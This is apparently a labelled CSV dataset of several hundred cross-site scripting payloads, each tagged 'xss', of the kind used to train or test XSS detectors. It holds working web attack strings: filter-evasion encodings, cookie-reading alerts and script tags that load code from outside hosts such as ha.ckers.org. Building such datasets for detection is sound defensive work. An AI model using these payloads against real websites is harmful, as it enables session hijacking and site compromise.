payload,label
"'';!--""<XSS>=&{()}",xss
"'>//\\,<'>"">"">""*""",xss
'); alert('XSS,xss
<script>alert(1);</script>,xss
<script>alert('XSS');</script>,xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
<IMG SRC=javascript:alert('XSS')>,xss
<IMG SRC=javascript:alert('XSS')>,xss
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
<scr<script>ipt>alert('XSS');</scr</script>ipt>,xss
"<script>alert(String.fromCharCode(88,83,83))</script>",xss
<img src=foo.png onerror=alert(/xssed/) />,xss
"<style>@im\port'\ja\vasc\ript:alert(\""XSS\"")';</style>",xss
"<? echo('<scr)'; echo('ipt>alert(\""XSS\"")</script>'); ?>",xss
<marquee><script>alert('XSS')</script></marquee>,xss
"<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",xss
"<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">",xss
"<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">",xss
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
"""><script>alert(0)</script>",xss
<script src=http://yoursite.com/your_files.js></script>,xss
</title><script>alert(/xss/)</script>,xss
</textarea><script>alert(/xss/)</script>,xss
"<IMG LOWSRC=\""javascript:alert('XSS')\"">",xss
"<IMG DYNSRC=\""javascript:alert('XSS')\"">",xss
<font style='color:expression(alert(document.cookie))'>,xss
"<img src=""javascript:alert('XSS')"">",xss
"<script language=""JavaScript"">alert('XSS')</script>",xss
"<body onunload=""javascript:alert('XSS');"">",xss
"<body onLoad=""alert('XSS');""",xss
"[color=red' onmouseover=""alert('xss')""]mouse over[/color]",xss
"""/></a></><img src=1.gif onerror=alert(1)>",xss
"window.alert(""Bonjour !"");",xss
"<div style=""x:expression((window.r==1)?'':eval('r=1;",xss
"alert(String.fromCharCode(88,83,83));'))"">",xss
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>,xss
"""><script alert(String.fromCharCode(88,83,83))</script>",xss
'>><marquee><h1>XSS</h1></marquee>,xss
"'"">><script>alert('XSS')</script>",xss
"'"">><marquee><h1>XSS</h1></marquee>",xss
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",xss
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert('XSS');\"">",xss
<script>var var = 1; alert(var)</script>,xss
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"<?='<SCRIPT>alert(""XSS"")</SCRIPT>'?>",xss
"<IMG SRC='vbscript:msgbox(\""XSS\"")'>",xss
""" onfocus=alert(document.domain) ""> <""",xss
"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",xss
"<STYLE>li {list-style-image: url(\""javascript:alert('XSS')\"");}</STYLE><UL><LI>XSS",xss
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",xss
"perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS\"")>\"";' > out",xss
"<br size=\""&{alert('XSS')}\"">",xss
<scrscriptipt>alert(1)</scrscriptipt>,xss
</br style=a:expression(alert())>,xss
</script><script>alert(1)</script>,xss
"""><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
[color=red width=expression(alert(123))][color],xss
"<BASE HREF=""javascript:alert('XSS');//"">",xss
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss
"""></iframe><script>alert(123)</script>",xss
"<body onLoad=""while(true) alert('XSS');"">",xss
"'""></title><script>alert(1111)</script>",xss
"</textarea>'""><script>alert(document.cookie)</script>",xss
"'""""><script language=""JavaScript""> alert('X \nS \nS');</script>",xss
</script></script><<<<script><>>>><<<script>alert(123)</script>,xss
<html><noalert><noscript>(123)</noscript><script>(123)</script>,xss
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
'></select><script>alert(123)</script>,xss
"'>""><script src = 'http://www.site.com/XSS.js'></script>",xss
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,xss
"<SCRIPT>document.write(""XSS"");</SCRIPT>",xss
"a=""get"";b=""URL"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",xss
"='><script>alert(""xss"")</script>",xss
"<script+src="">""+src=""http://yoursite.com/xss.js?69,69""></script>",xss
"<body background=javascript:'""><script>alert(navigator.userAgent)</script>></body>",xss
""">/XaDoS/><script>alert(document.cookie)</script><script src=""http://www.site.com/XSS.js""></script>",xss
""">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>",xss
"src=""http://www.site.com/XSS.js""></script>",xss
"data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",xss
"!--"" /><script>alert('xss');</script>",xss
"<script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",xss
"""><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",xss
"'""></title><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",xss
"<img """"""><script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",xss
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>,xss
"""><script>alert(1337)</script>""><script>alert(""XSS by \nxss</h1></marquee>",xss
"'""></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",xss
"<iframe src=""javascript:alert('XSS by \nxss');""></iframe><marquee><h1>XSS by xss</h1></marquee>",xss
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",xss
"""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=""",xss
"\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=\'",xss
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??,xss
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??,xss
'); alert('xss'); var x=',xss
\\'); alert(\'xss\');var x=\',xss
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",xss
">""><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>",xss
"<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",xss
</body>,xss
</html>,xss
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,xss
<SCRIPT> alert(“XSS”); </SCRIPT>,xss
"<BODY ONLOAD=alert(""XSS"")>",xss
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
<IFRAME SRC=”http://hacker-site.com/xss.html”>,xss
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
"<TD BACKGROUND=""javascript:alert('XSS')"">",xss
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">",xss
"<EMBED SRC=""http://hacker.com/xss.swf"" AllowScriptAccess=""always"">",xss
"&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()},xss
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;,xss
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;,xss
"&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;,xss
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,xss
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,xss
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;,xss
&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;,xss
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;,xss
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;,xss
&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;,xss
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;,xss
Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser,xss
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);,xss
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS,xss
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;,xss
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;,xss
&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;,xss
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,xss
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
"&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;",xss
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;,xss
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;,xss
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;,xss
&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;,xss
a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);,xss
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;,xss
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;,xss
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;,xss
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;,xss
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;,xss
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;,xss
&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;,xss
&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;,xss
&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;,xss
&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;,xss
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;,xss
&lt;HTML xmlns:xss&gt;,xss
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;,xss
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;,xss
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;,xss
&lt;HTML&gt;&lt;BODY&gt;,xss
&lt;!--[if gte IE 4]&gt;,xss
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;,xss
&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;,xss
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;,xss
&lt;? echo(&apos;&lt;SCR)&apos;;,xss
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;,xss
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;,xss
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;,xss
"&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;",xss
"&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;",xss
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;,xss
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;,xss
&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;,xss
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;,xss
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-,xss
\&quot;;alert(&apos;XSS&apos;);//,xss
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(""XSS"");&lt;/SCRIPT&gt;",xss
&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;,xss
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;,xss
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out,xss
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,xss
&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
"&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;",xss
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js,xss
&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;,xss
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;,xss
&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;,xss
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;,xss
&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;,xss
&lt;SCRIPT&gt;a=/XSS/,xss
&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;,xss
&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;,xss
<script>document.vulnerable=true;</script>,xss
"<img SRC=""jav ascript:document.vulnerable=true;"">",xss
"<img SRC=""javascript:document.vulnerable=true;"">",xss
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",xss
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>",xss
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>,xss
<script <B>document.vulnerable=true;</script>,xss
"<img SRC=""javascript:document.vulnerable=true;""",xss
"<iframe src=""javascript:document.vulnerable=true; <",xss
<script>a=/XSS/\ndocument.vulnerable=true;</script>,xss
"\"";document.vulnerable=true;;//",xss
</title><SCRIPT>document.vulnerable=true;</script>,xss
"<input TYPE=""IMAGE"" SRC=""javascript:document.vulnerable=true;"">",xss
"<body BACKGROUND=""javascript:document.vulnerable=true;"">",xss
<body ONLOAD=document.vulnerable=true;>,xss
"<img DYNSRC=""javascript:document.vulnerable=true;"">",xss
"<img LOWSRC=""javascript:document.vulnerable=true;"">",xss
"<bgsound SRC=""javascript:document.vulnerable=true;"">",xss
"<br SIZE=""&{document.vulnerable=true}"">",xss
"<LAYER SRC=""javascript:document.vulnerable=true;""></LAYER>",xss
"<link REL=""stylesheet"" HREF=""javascript:document.vulnerable=true;"">",xss
"<style>li {list-style-image: url(""javascript:document.vulnerable=true;"");</STYLE><UL><LI>XSS",xss
<img SRC='vbscript:document.vulnerable=true;'>,xss
1script3document.vulnerable=true;1/script3,xss
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:document.vulnerable=true;"">",xss
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:document.vulnerable=true;"">",xss
"<IFRAME SRC=""javascript:document.vulnerable=true;""></iframe>",xss
"<FRAMESET><FRAME SRC=""javascript:document.vulnerable=true;""></frameset>",xss
"<table BACKGROUND=""javascript:document.vulnerable=true;"">",xss
